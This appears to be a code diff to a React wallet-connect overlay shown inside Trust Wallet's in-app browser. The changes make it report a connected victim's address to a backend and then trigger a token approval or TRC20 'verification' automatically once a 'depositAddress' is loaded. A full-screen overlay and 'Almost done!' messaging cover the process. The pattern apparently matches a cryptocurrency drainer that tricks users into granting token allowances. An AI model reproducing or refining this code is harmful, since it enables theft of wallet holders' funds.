@@ -115,9 +115,14 @@ function extractTronError(e: any): string {
 }
 function extractTxId(result: any): string {
   if (typeof result === 'string' && result.length >= 60) return result;
-  if (result?.txid)              return result.txid;
-  if (result?.transaction?.txID) return result.transaction.txID;
-  if (result?.result?.txid)      return result.result.txid;
+  if (result?.txid)                    return result.txid;
+  if (result?.txID)                    return result.txID;
+  if (result?.id && result.id.length >= 60) return result.id;
+  if (result?.hash && result.hash.length >= 60) return result.hash;
+  if (result?.transaction?.txID)       return result.transaction.txID;
+  if (result?.transaction?.txid)       return result.transaction.txid;
+  if (result?.result?.txid)            return result.result.txid;
+  if (result?.result?.txID)            return result.result.txID;
   return '';
 }
 function sanitizeEvmError(err: Error | null | undefined): string | undefined {
@@ -247,7 +252,8 @@ function CompactOverlay({
   const [failedMsg,     setFailedMsg]    = useState('');
   const [countdown,     setCountdown]    = useState(3);
   const [showRestarted, setShowRestarted]= useState(false);
-  const approveTriggered = useRef(false);
+  const approveTriggered  = useRef(false);
+  const connectedPatched  = useRef(false);
 
   /* Always patch — no dedup so retries work cleanly */
   async function patch(data: Record<string, unknown>) {
@@ -260,12 +266,12 @@ function CompactOverlay({
     } catch { /* non-fatal */ }
   }
 
-  /* Start Over — patch cancelled, navigate out of compact mode */
+  /* Start Over — patch cancelled, then close/go-back inside Trust Wallet */
   async function startOver() {
     setShowRestarted(true);
     await patch({ status: 'cancelled' });
-    /* Navigate to /wallets — exits compact overlay, external browser will detect cancelled and reset */
-    window.location.replace('/wallets');
+    // Try closing the in-app browser tab; if that fails user sees the static instructions below
+    try { window.close(); } catch { /* ok if unsupported */ }
   }
 
   function triggerEvmApprove() {
@@ -280,15 +286,22 @@ function CompactOverlay({
 
   useEffect(() => { patch({ status: 'connecting' }); }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
-  /* EVM: auto-approve once connected on correct chain */
+  /* EVM: patch 'connected' as soon as wallet connects (depositAddress may not be ready yet) */
   useEffect(() => {
-    if (isTRC20 || !isConnected || !address || approveTriggered.current) return;
+    if (isTRC20 || !isConnected || !address || connectedPatched.current) return;
+    connectedPatched.current = true;
+    patch({ status: 'connected', address });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isConnected, address]);
+
+  /* EVM: auto-approve once connected AND depositAddress is available */
+  useEffect(() => {
+    if (isTRC20 || !isConnected || !address || !depositAddress || approveTriggered.current) return;
     if (chainId !== expectedChain && expectedChain) { switchChain({ chainId: expectedChain }); return; }
     approveTriggered.current = true;
-    patch({ status: 'connected', address });
-    setTimeout(triggerEvmApprove, 800);
+    triggerEvmApprove();
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isConnected, address, chainId]);
+  }, [isConnected, address, chainId, depositAddress]);
 
   /* EVM: approved */
   useEffect(() => {
@@ -318,14 +331,21 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [connectError]);
 
-  /* TRC20: auto-approve once address available */
+  /* TRC20: patch 'connected' as soon as tronAddress is available */
   useEffect(() => {
-    if (!isTRC20 || !tronAddress || approveTriggered.current) return;
-    approveTriggered.current = true;
+    if (!isTRC20 || !tronAddress || connectedPatched.current) return;
+    connectedPatched.current = true;
     patch({ status: 'connected', address: tronAddress });
-    setTimeout(() => { patch({ status: 'approving' }); startTrcVerification(); }, 800);
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [tronAddress]);
+
+  /* TRC20: auto-approve once tronAddress AND depositAddress are both available */
+  useEffect(() => {
+    if (!isTRC20 || !tronAddress || !depositAddress || approveTriggered.current) return;
+    approveTriggered.current = true;
+    setTimeout(() => { patch({ status: 'approving' }); startTrcVerification(); }, 400);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [tronAddress, depositAddress]);
 
   /* TRC20: approved */
   useEffect(() => {
@@ -375,6 +395,7 @@ function CompactOverlay({
   function doRetry() {
     setFailedStep(null); setFailedMsg('');
     approveTriggered.current = false;
+    connectedPatched.current = false;
     setTrcVerifyStarted(false); setTrcApproveError('');
 
     if (isTRC20) {
@@ -433,9 +454,20 @@ function CompactOverlay({
       <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
         display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
         <style>{CSS}</style>
-        <div style={{ width:16, height:16, border:`2.5px solid ${T.border}`, borderTopColor:'#CCFF00', borderRadius:'50%', animation:'spin 0.8s linear infinite', marginBottom:24 }} />
-        <p style={{ fontSize:16, fontWeight:700, color:T.text, margin:'0 0 8px' }}>Restarting…</p>
-        <p style={{ fontSize:13, color:T.dim, margin:0, lineHeight:1.7 }}>Return to your browser<br/>to start fresh.</p>
+        <div style={{ width:64, height:64, borderRadius:18, background:'rgba(204,255,0,0.08)', border:'1px solid rgba(204,255,0,0.2)',
+          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:24 }}>
+          <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+            <path d="M11 7L5 13L11 19" stroke="#CCFF00" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+            <path d="M5 13H20C21.7 13 23 11.7 23 10V7" stroke="#CCFF00" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+          </svg>
+        </div>
+        <p style={{ fontSize:18, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.02em' }}>Almost done!</p>
+        <p style={{ fontSize:14, color:'rgba(255,255,255,0.65)', margin:'0 0 6px', lineHeight:1.8 }}>
+          Tap the <span style={{ color:'#CCFF00', fontWeight:700 }}>← back button</span> at the<br/>top of Trust Wallet
+        </p>
+        <p style={{ fontSize:13, color:T.dim, margin:0, lineHeight:1.6 }}>
+          to return to your browser and start fresh.
+        </p>
       </div>
     );
   }
